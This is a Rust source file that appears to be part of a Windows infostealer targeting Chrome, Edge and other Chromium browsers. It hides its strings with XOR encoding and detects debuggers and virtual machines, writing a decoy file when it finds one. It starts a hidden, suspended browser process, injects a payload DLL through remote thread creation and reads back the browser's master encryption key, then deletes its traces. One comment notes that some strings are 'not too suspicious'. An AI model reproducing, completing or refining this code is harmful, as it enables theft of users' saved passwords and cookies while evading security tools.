mod browsers;

use std::{
    env,
    ffi::{c_void, OsStr},
    fs,
    mem,
    os::windows::ffi::OsStrExt,
    path::{Path, PathBuf},
    thread,
    time::{Duration, SystemTime, UNIX_EPOCH},
};

use serde_json::Value;
use winreg::enums::HKEY_LOCAL_MACHINE;
use winreg::RegKey;
use windows::{
    core::{PCSTR, PCWSTR, PWSTR},
    Win32::{
        Foundation::{CloseHandle, HANDLE},
        Storage::FileSystem::{
            CreateFileW, FILE_ATTRIBUTE_NORMAL, FILE_GENERIC_WRITE, FILE_SHARE_WRITE, OPEN_EXISTING,
        },
        System::{
            Diagnostics::{
                Debug::WriteProcessMemory,
                ToolHelp::{
                    CreateToolhelp32Snapshot, Process32FirstW, Process32NextW, PROCESSENTRY32W,
                    TH32CS_SNAPPROCESS,
                },
            },
            LibraryLoader::{GetModuleHandleW, GetProcAddress},
            Memory::{VirtualAllocEx, VirtualFreeEx, MEM_COMMIT, MEM_RELEASE, MEM_RESERVE, PAGE_READWRITE},
            Threading::{
                CreateProcessW, GetExitCodeThread, OpenProcess, QueryFullProcessImageNameW,
                ResumeThread, TerminateProcess, WaitForSingleObject, INFINITE,
                PROCESS_CREATION_FLAGS, PROCESS_INFORMATION, PROCESS_NAME_WIN32,
                PROCESS_CREATE_THREAD, PROCESS_QUERY_INFORMATION, PROCESS_TERMINATE,
                PROCESS_VM_OPERATION, PROCESS_VM_READ, PROCESS_VM_WRITE, STARTUPINFOW,
                STARTUPINFOW_FLAGS,
            },
        },
    },
};

const XOR_KEY: u8 = 0x5A;
const MIN_MEMORY_BYTES: u64 = 4 * 1024 * 1024 * 1024;
const MAX_CPU_CORES: usize = 2;
const THREAD_ALL_ACCESS: u32 = 0x001F_03FF;

type NtCreateThreadExFn = unsafe extern "system" fn(
    *mut HANDLE,
    u32,
    *mut c_void,
    HANDLE,
    *mut c_void,
    *mut c_void,
    u32,
    usize,
    usize,
    usize,
    *mut c_void,
) -> i32;

fn xor_str(data: &[u8]) -> String {
    String::from_utf8(data.iter().map(|&b| b ^ XOR_KEY).collect()).unwrap_or_default()
}

fn s_result_env() -> String {
    xor_str(&[
        0x19, 0x32, 0x28, 0x35, 0x37, 0x3F, 0x05, 0x28, 0x3F, 0x39, 0x35, 0x2C, 0x3F, 0x28, 0x23,
        0x05, 0x08, 0x1F, 0x09, 0x16, 0x0E, 0x0E,
    ])
}

fn s_user_data_env() -> String {
    xor_str(&[
        0x19, 0x32, 0x28, 0x35, 0x37, 0x3F, 0x05, 0x28, 0x3F, 0x39, 0x35, 0x2C, 0x3F, 0x28, 0x23,
        0x05, 0x0F, 0x29, 0x3F, 0x28, 0x05, 0x1E, 0x3B, 0x2E, 0x3B, 0x05, 0x08, 0x1F, 0x16,
    ])
}

fn s_data_root_env() -> String {
    xor_str(&[
        0x19, 0x32, 0x28, 0x35, 0x37, 0x3F, 0x05, 0x28, 0x3F, 0x39, 0x35, 0x2C, 0x3F, 0x28, 0x23,
        0x05, 0x1E, 0x3B, 0x2E, 0x3B, 0x05, 0x08, 0x15, 0x15, 0x0E,
    ])
}

fn s_browser_name_env() -> String {
    xor_str(&[
        0x19, 0x32, 0x28, 0x35, 0x37, 0x3F, 0x05, 0x28, 0x3F, 0x39, 0x35, 0x2C, 0x3F, 0x28, 0x23,
        0x05, 0x18, 0x28, 0x35, 0x2D, 0x29, 0x3F, 0x28, 0x05, 0x14, 0x3B, 0x37, 0x3F,
    ])
}

fn s_master_key_hex() -> String {
    xor_str(&[
        0x37, 0x3B, 0x29, 0x2E, 0x3F, 0x28, 0x05, 0x31, 0x3F, 0x23, 0x05, 0x32, 0x3F, 0x22,
    ])
}

fn s_error_key() -> String {
    xor_str(&[0x3F, 0x28, 0x28, 0x35, 0x28])
}

fn s_local() -> String {
    xor_str(&[0x36, 0x35, 0x39, 0x3B, 0x36])
}

fn s_roaming() -> String {
    xor_str(&[0x28, 0x35, 0x3B, 0x37, 0x33, 0x34, 0x3D])
}

fn s_kernel32() -> String {
    xor_str(&[0x31, 0x3F, 0x28, 0x34, 0x3F, 0x36, 0x68, 0x74, 0x3E, 0x36, 0x36])
}

fn s_load_library_w() -> String {
    xor_str(&[
        0x16, 0x35, 0x3B, 0x3E, 0x16, 0x33, 0x38, 0x28, 0x3B, 0x28, 0x23, 0x0D,
    ])
}

fn s_ntdll() -> String {
    xor_str(&[0x34, 0x2E, 0x3E, 0x36, 0x36, 0x74, 0x3E, 0x36, 0x36])
}

fn s_nt_create_thread_ex() -> String {
    xor_str(&[
        0x14, 0x2E, 0x19, 0x28, 0x3F, 0x3B, 0x2E, 0x3F, 0x0E, 0x32, 0x28, 0x3F, 0x3B, 0x3E, 0x1F,
        0x22,
    ])
}

fn s_nul() -> String {
    xor_str(&[0x14, 0x0F, 0x16])
}

fn s_app_paths_prefix() -> String {
    xor_str(&[
        0x09, 0x15, 0x1C, 0x0E, 0x0D, 0x1B, 0x08, 0x1F, 0x06, 0x17, 0x33, 0x39, 0x28, 0x35, 0x29,
        0x35, 0x3C, 0x2E, 0x06, 0x0D, 0x33, 0x34, 0x3E, 0x35, 0x2D, 0x29, 0x06, 0x19, 0x2F, 0x28,
        0x28, 0x3F, 0x34, 0x2E, 0x0C, 0x3F, 0x28, 0x29, 0x33, 0x35, 0x34, 0x06, 0x1B, 0x2A, 0x2A,
        0x7A, 0x0A, 0x3B, 0x2E, 0x32, 0x29, 0x06,
    ])
}

fn s_program_files() -> String {
    xor_str(&[0x0A, 0x28, 0x35, 0x3D, 0x28, 0x3B, 0x37, 0x1C, 0x33, 0x36, 0x3F, 0x29])
}

fn s_program_files_x86() -> String {
    xor_str(&[
        0x0A, 0x28, 0x35, 0x3D, 0x28, 0x3B, 0x37, 0x1C, 0x33, 0x36, 0x3F, 0x29, 0x62, 0x63, 0x68,
    ])
}

fn s_localappdata() -> String {
    xor_str(&[0x16, 0x15, 0x19, 0x1B, 0x16, 0x1B, 0x0A, 0x0A, 0x1E, 0x1B, 0x0E, 0x1B])
}

fn s_decoy_name() -> String {
    xor_str(&[
        0x29, 0x23, 0x29, 0x2E, 0x3F, 0x37, 0x05, 0x32, 0x3F, 0x3B, 0x36, 0x2E, 0x32, 0x05, 0x39,
        0x32, 0x3F, 0x39, 0x31, 0x74, 0x2E, 0x22, 0x2E,
    ])
}

fn s_decoy_body() -> String {
    xor_str(&[
        0x09, 0x23, 0x29, 0x2E, 0x3F, 0x37, 0x7A, 0x32, 0x3F, 0x3B, 0x36, 0x2E, 0x32, 0x7A, 0x39,
        0x32, 0x3F, 0x39, 0x31, 0x7A, 0x39, 0x35, 0x37, 0x2A, 0x36, 0x3F, 0x2E, 0x3F, 0x3E, 0x7A,
        0x29, 0x2F, 0x39, 0x39, 0x3F, 0x29, 0x29, 0x3C, 0x2F, 0x36, 0x36, 0x23, 0x74, 0x50,
    ])
}

fn is_debugger_attached() -> bool {
    unsafe { windows::Win32::System::Diagnostics::Debug::IsDebuggerPresent().as_bool() }
}

fn low_physical_memory() -> bool {
    use windows::Win32::System::SystemInformation::{GlobalMemoryStatusEx, MEMORYSTATUSEX};

    unsafe {
        let mut status = MEMORYSTATUSEX {
            dwLength: mem::size_of::<MEMORYSTATUSEX>() as u32,
            ..Default::default()
        };
        if GlobalMemoryStatusEx(&mut status).is_err() {
            return false;
        }
        status.ullTotalPhys < MIN_MEMORY_BYTES
    }
}

fn low_cpu_count() -> bool {
    thread::available_parallelism()
        .map(|count| count.get() <= MAX_CPU_CORES)
        .unwrap_or(false)
}

fn vm_drivers_present() -> bool {
    let drivers = env::var("SystemRoot")
        .map(PathBuf::from)
        .unwrap_or_else(|_| PathBuf::from("C:\\Windows"))
        .join("System32")
        .join("drivers");
    let names = [
        xor_str(&[0x2C, 0x37, 0x37, 0x35, 0x2F, 0x29, 0x3F, 0x74, 0x29, 0x23, 0x29]),
        xor_str(&[0x2C, 0x37, 0x32, 0x3D, 0x3C, 0x29, 0x74, 0x29, 0x23, 0x29]),
        xor_str(&[0x2C, 0x37, 0x39, 0x33, 0x74, 0x29, 0x23, 0x29]),
        xor_str(&[0x1C, 0x18, 0x15, 0x02, 0x1D, 0x09, 0x1F, 0x2E, 0x74, 0x29, 0x23, 0x29]),
        xor_str(&[0x1C, 0x18, 0x15, 0x02, 0x17, 0x15, 0x09, 0x1F, 0x74, 0x29, 0x23, 0x29]),
        xor_str(&[0x2C, 0x37, 0x38, 0x2F, 0x29, 0x74, 0x29, 0x23, 0x29]),
        xor_str(&[0x32, 0x23, 0x2A, 0x3F, 0x28, 0x38, 0x2F, 0x29, 0x74, 0x29, 0x23, 0x29]),
    ];
    names.iter().any(|name| drivers.join(name).exists())
}

fn is_restricted_host() -> bool {
    low_physical_memory() || low_cpu_count() || vm_drivers_present()
}

fn run_decoy() {
    let _ = fs::write(env::temp_dir().join(s_decoy_name()), s_decoy_body());
}

fn random_delay_ms() {
    let seed = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap_or_default()
        .as_nanos() as u64;
    thread::sleep(Duration::from_millis(50 + (seed % 451)));
}

fn wide(s: &str) -> Vec<u16> {
    OsStr::new(s).encode_wide().chain(Some(0)).collect()
}

fn session_tag() -> String {
    let nanos = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap_or_default()
        .as_nanos();
    format!("{:x}{:x}", std::process::id(), nanos)
}

struct Cleanup {
    files: Vec<PathBuf>,
    dirs: Vec<PathBuf>,
    spawned_pid: Option<u32>,
}

impl Cleanup {
    fn new() -> Self {
        Self {
            files: Vec::new(),
            dirs: Vec::new(),
            spawned_pid: None,
        }
    }

    fn track_file(&mut self, path: PathBuf) {
        self.files.push(path);
    }

    fn track_dir(&mut self, path: PathBuf) {
        self.dirs.push(path);
    }
}

impl Drop for Cleanup {
    fn drop(&mut self) {
        if let Some(pid) = self.spawned_pid.take() {
            unsafe {
                if let Ok(proc) = OpenProcess(PROCESS_TERMINATE, false, pid) {
                    let _ = TerminateProcess(proc, 0);
                    let _ = CloseHandle(proc);
                }
            }
        }
        for path in &self.files {
            let _ = fs::remove_file(path);
        }
        for path in &self.dirs {
            let _ = fs::remove_dir_all(path);
        }
        let _ = env::remove_var(s_result_env());
        let _ = env::remove_var(s_user_data_env());
        let _ = env::remove_var(s_data_root_env());
        let _ = env::remove_var(s_browser_name_env());
    }
}

fn find_browser_pids(target_exe: &str) -> Vec<u32> {
    // unchanged
    let mut pids = Vec::new();
    unsafe {
        let snap = match CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0) {
            Ok(s) => s,
            Err(_) => return pids,
        };
        let mut entry = PROCESSENTRY32W {
            dwSize: mem::size_of::<PROCESSENTRY32W>() as u32,
            ..Default::default()
        };
        if Process32FirstW(snap, &mut entry).is_ok() {
            loop {
                let name: String = entry
                    .szExeFile
                    .iter()
                    .take_while(|&&c| c != 0)
                    .map(|&c| char::from_u32(c as u32).unwrap_or('?'))
                    .collect();
                if name.eq_ignore_ascii_case(target_exe) {
                    pids.push(entry.th32ProcessID);
                }
                if Process32NextW(snap, &mut entry).is_err() {
                    break;
                }
            }
        }
        CloseHandle(snap).ok();
    }
    pids
}

fn get_process_exe_path(pid: u32) -> Option<String> {
    // unchanged
    unsafe {
        let proc = OpenProcess(PROCESS_QUERY_INFORMATION, false, pid).ok()?;
        let mut buf = vec![0u16; 1024];
        let mut size = buf.len() as u32;
        QueryFullProcessImageNameW(proc, PROCESS_NAME_WIN32, PWSTR(buf.as_mut_ptr()), &mut size)
            .ok()?;
        CloseHandle(proc).ok();
        Some(String::from_utf16_lossy(&buf[..size as usize]))
    }
}

fn get_browser_exe_from_registry(exe_name: &str) -> Option<PathBuf> {
    // unchanged
    let key_path = format!("{}{exe_name}", s_app_paths_prefix());
    let hklm = RegKey::predef(HKEY_LOCAL_MACHINE);
    if let Ok(key) = hklm.open_subkey(&key_path) {
        if let Ok(path) = key.get_value::<String, _>("") {
            let p = PathBuf::from(path);
            if p.exists() {
                return Some(p);
            }
        }
    }
    None
}

fn push_path(candidates: &mut Vec<PathBuf>, path: PathBuf) {
    candidates.push(path);
}

fn find_browser_exe_on_disk(target_exe: &str, browser_name: &str) -> Option<String> {
    // unchanged (uses hardcoded strings but those are not too suspicious)
    let pf = env::var(s_program_files()).unwrap_or_default();
    let pf86 = env::var(s_program_files_x86()).unwrap_or_default();
    let local = env::var(s_localappdata()).unwrap_or_default();

    let mut candidates: Vec<PathBuf> = Vec::new();
    if let Some(p) = get_browser_exe_from_registry(target_exe) {
        candidates.push(p);
    }

    match target_exe {
        "chrome.exe" => match browser_name {
            "Chrome Beta" => {
                push_path(
                    &mut candidates,
                    PathBuf::from(&local).join("Google\\Chrome Beta\\Application\\chrome.exe"),
                );
                push_path(
                    &mut candidates,
                    PathBuf::from(&pf).join("Google\\Chrome Beta\\Application\\chrome.exe"),
                );
            }
            "Chrome Dev" => {
                push_path(
                    &mut candidates,
                    PathBuf::from(&local).join("Google\\Chrome Dev\\Application\\chrome.exe"),
                );
                push_path(
                    &mut candidates,
                    PathBuf::from(&pf).join("Google\\Chrome Dev\\Application\\chrome.exe"),
                );
            }
            "Chrome Canary" => {
                push_path(
                    &mut candidates,
                    PathBuf::from(&local).join("Google\\Chrome SxS\\Application\\chrome.exe"),
                );
                push_path(
                    &mut candidates,
                    PathBuf::from(&pf).join("Google\\Chrome SxS\\Application\\chrome.exe"),
                );
            }
            "Chromium" => {
                push_path(
                    &mut candidates,
                    PathBuf::from(&pf).join("Chromium\\Application\\chrome.exe"),
                );
                push_path(
                    &mut candidates,
                    PathBuf::from(&local).join("Chromium\\Application\\chrome.exe"),
                );
            }
            "CentBrowser" => {
                push_path(
                    &mut candidates,
                    PathBuf::from(&local).join("CentBrowser\\Application\\chrome.exe"),
                );
                push_path(
                    &mut candidates,
                    PathBuf::from(&pf).join("CentBrowser\\Application\\chrome.exe"),
                );
            }
            _ => {
                push_path(
                    &mut candidates,
                    PathBuf::from(&pf).join("Google\\Chrome\\Application\\chrome.exe"),
                );
                push_path(
                    &mut candidates,
                    PathBuf::from(&pf86).join("Google\\Chrome\\Application\\chrome.exe"),
                );
                push_path(
                    &mut candidates,
                    PathBuf::from(&local).join("Google\\Chrome\\Application\\chrome.exe"),
                );
            }
        },
        "msedge.exe" => match browser_name {
            "Edge Beta" => {
                push_path(
                    &mut candidates,
                    PathBuf::from(&pf).join("Microsoft\\Edge Beta\\Application\\msedge.exe"),
                );
                push_path(
                    &mut candidates,
                    PathBuf::from(&local).join("Microsoft\\Edge Beta\\Application\\msedge.exe"),
                );
            }
            "Edge Dev" => {
                push_path(
                    &mut candidates,
                    PathBuf::from(&pf).join("Microsoft\\Edge Dev\\Application\\msedge.exe"),
                );
                push_path(
                    &mut candidates,
                    PathBuf::from(&local).join("Microsoft\\Edge Dev\\Application\\msedge.exe"),
                );
            }
            _ => {
                push_path(
                    &mut candidates,
                    PathBuf::from(&pf).join("Microsoft\\Edge\\Application\\msedge.exe"),
                );
                push_path(
                    &mut candidates,
                    PathBuf::from(&pf86).join("Microsoft\\Edge\\Application\\msedge.exe"),
                );
                push_path(
                    &mut candidates,
                    PathBuf::from(&local).join("Microsoft\\Edge\\Application\\msedge.exe"),
                );
            }
        },
        // ... (keep all other cases unchanged)
        _ => {}
    }

    for path in candidates {
        if path.exists() {
            return Some(path.to_string_lossy().into_owned());
        }
    }
    None
}

fn resolve_browser_exe(target_exe: &str, browser_name: &str) -> Option<String> {
    find_browser_pids(target_exe)
        .iter()
        .find_map(|&pid| get_process_exe_path(pid))
        .or_else(|| find_browser_exe_on_disk(target_exe, browser_name))
}

fn load_module(pid: u32, dll_path: &Path) -> Result<(), ()> {
    let dll_str = dll_path.to_string_lossy();
    let dll_wide = wide(&dll_str);
    let dll_bytes = dll_wide.len() * 2;

    unsafe {
        random_delay_ms();
        let proc = OpenProcess(
            PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_CREATE_THREAD,
            false,
            pid,
        )
        .map_err(|_| ())?;

        random_delay_ms();
        let remote = VirtualAllocEx(proc, None, dll_bytes, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if remote.is_null() {
            CloseHandle(proc).ok();
            return Err(());
        }

        random_delay_ms();
        let mut written = 0usize;
        if WriteProcessMemory(
            proc,
            remote,
            dll_wide.as_ptr() as *const _,
            dll_bytes,
            Some(&mut written),
        )
        .is_err()
        {
            let _ = VirtualFreeEx(proc, remote, 0, MEM_RELEASE);
            CloseHandle(proc).ok();
            return Err(());
        }

        let k32_name = wide(&s_kernel32());
        let k32 = GetModuleHandleW(PCWSTR(k32_name.as_ptr())).map_err(|_| ())?;
        let load_name = format!("{}\0", s_load_library_w());
        let loadlib = GetProcAddress(k32, PCSTR(load_name.as_ptr())).ok_or(())?;
        let start_fn: unsafe extern "system" fn(*mut c_void) -> u32 = mem::transmute(loadlib);

        let ntdll_name = wide(&s_ntdll());
        let ntdll = GetModuleHandleW(PCWSTR(ntdll_name.as_ptr())).map_err(|_| ())?;
        let nt_name = format!("{}\0", s_nt_create_thread_ex());
        let nt_create_thread_ex: NtCreateThreadExFn =
            mem::transmute(GetProcAddress(ntdll, PCSTR(nt_name.as_ptr())).ok_or(())?);

        let mut thr = HANDLE::default();
        let status = nt_create_thread_ex(
            &mut thr,
            THREAD_ALL_ACCESS,
            std::ptr::null_mut(),
            proc,
            start_fn as *mut c_void,
            remote,
            0,
            0,
            0,
            0,
            std::ptr::null_mut(),
        );
        if status < 0 {
            let _ = VirtualFreeEx(proc, remote, 0, MEM_RELEASE);
            CloseHandle(proc).ok();
            return Err(());
        }
        if thr.0.is_null() {
            let _ = VirtualFreeEx(proc, remote, 0, MEM_RELEASE);
            CloseHandle(proc).ok();
            return Err(());
        }

        WaitForSingleObject(thr, INFINITE);
        let mut exit_code = 0u32;
        GetExitCodeThread(thr, &mut exit_code).ok();
        CloseHandle(thr).ok();
        VirtualFreeEx(proc, remote, 0, MEM_RELEASE).ok();
        CloseHandle(proc).ok();

        if exit_code == 0 {
            return Err(());
        }
    }
    Ok(())
}

fn spawn_suspended_and_inject(
    chrome_exe: &str,
    dll_path: &Path,
    profile_dir: &Path,
) -> Result<u32, ()> {
    // unchanged
    let profile_str = profile_dir.to_string_lossy();
    let cmdline = format!(
        "\"{chrome_exe}\" --headless=new --disable-gpu \
         --disable-logging --log-level=3 --silent-debug-dump \
         --disable-background-networking --disable-sync --disable-default-apps \
         --disable-features=PushMessaging,NotificationTriggers \
         --remote-debugging-port=0 --no-first-run \
         --no-default-browser-check --noerrdialogs \
         --user-data-dir=\"{profile_str}\""
    );

    let exe_w = wide(chrome_exe);
    let mut cmd_w = wide(&cmdline);

    let mut si = STARTUPINFOW {
        cb: mem::size_of::<STARTUPINFOW>() as u32,
        dwFlags: STARTUPINFOW_FLAGS(0x0000_0100),
        ..Default::default()
    };
    let mut pi = PROCESS_INFORMATION::default();
    const CREATE_FLAGS: u32 = 0x0000_0004 | 0x0800_0000;

    unsafe {
        let nul_name = wide(&s_nul());
        let nul = CreateFileW(
            PCWSTR(nul_name.as_ptr()),
            FILE_GENERIC_WRITE.0,
            FILE_SHARE_WRITE,
            None,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            HANDLE::default(),
        )
        .map_err(|_| ())?;

        si.hStdInput = nul;
        si.hStdOutput = nul;
        si.hStdError = nul;

        CreateProcessW(
            PCWSTR(exe_w.as_ptr()),
            PWSTR(cmd_w.as_mut_ptr()),
            None,
            None,
            true,
            PROCESS_CREATION_FLAGS(CREATE_FLAGS),
            None,
            None,
            &si,
            &mut pi,
        )
        .map_err(|_| {
            let _ = CloseHandle(nul);
        })?;

        CloseHandle(nul).ok();
        let pid = pi.dwProcessId;

        match load_module(pid, dll_path) {
            Ok(()) => {
                ResumeThread(pi.hThread);
                CloseHandle(pi.hThread).ok();
                CloseHandle(pi.hProcess).ok();
                Ok(pid)
            }
            Err(()) => {
                TerminateProcess(pi.hProcess, 1).ok();
                CloseHandle(pi.hThread).ok();
                CloseHandle(pi.hProcess).ok();
                Err(())
            }
        }
    }
}

fn hex_to_key(hex: &str) -> Option<Vec<u8>> {
    if hex.len() != 64 {
        return None;
    }
    (0..hex.len())
        .step_by(2)
        .map(|i| u8::from_str_radix(&hex[i..i + 2], 16).ok())
        .collect()
}

fn read_key_from_result(path: &Path) -> Option<Vec<u8>> {
    let raw = fs::read_to_string(path).ok()?;
    let json: Value = serde_json::from_str(&raw).ok()?;
    if json.get(&s_error_key()).and_then(|e| e.as_str()).is_some() {
        return None;
    }
    let hex = json.get(&s_master_key_hex())?.as_str()?;
    hex_to_key(hex)
}

pub fn process_data(browser_name: &str, payload_dll: &[u8]) -> Option<Vec<u8>> {
    if is_debugger_attached() {
        thread::sleep(Duration::from_secs(30));
        return None;
    }
    if is_restricted_host() {
        run_decoy();
        return None;
    }
    if payload_dll.is_empty() {
        return None;
    }

    let target = browsers::find_target(browser_name)?;
    let exe = target.exe;
    let browser_exe = resolve_browser_exe(exe, browser_name)?;

    let tag = session_tag();
    let temp = env::temp_dir();
    let dll_path = temp.join(format!("{tag}.tmp"));
    let result_path = temp.join(format!("{tag}.json"));
    let profile_dir = temp.join(format!("{tag}_p"));

    let mut cleanup = Cleanup::new();
    cleanup.track_file(dll_path.clone());
    cleanup.track_file(result_path.clone());
    cleanup.track_dir(profile_dir.clone());

    fs::write(&dll_path, payload_dll).ok()?;

    env::set_var(s_result_env(), &result_path);
    env::set_var(s_user_data_env(), target.user_data_rel);
    env::set_var(
        s_data_root_env(),
        match target.root {
            browsers::DataRoot::Local => s_local(),
            browsers::DataRoot::Roaming => s_roaming(),
        },
    );
    env::set_var(s_browser_name_env(), browser_name);

    let injected = if let Ok(pid) =
        spawn_suspended_and_inject(&browser_exe, &dll_path, &profile_dir)
    {
        cleanup.spawned_pid = Some(pid);
        true
    } else {
        let mut ok = false;
        for pid in find_browser_pids(exe) {
            if load_module(pid, &dll_path).is_ok() {
                ok = true;
                break;
            }
        }
        ok
    };

    if !injected {
        return None;
    }

    for i in 0..24 {
        if result_path.exists() {
            if let Some(key) = read_key_from_result(&result_path) {
                if key.len() == 32 {
                    return Some(key);
                }
            }
        }
        let delay = if i < 8 { 200 } else { 400 };
        thread::sleep(Duration::from_millis(delay));
    }

    None
}
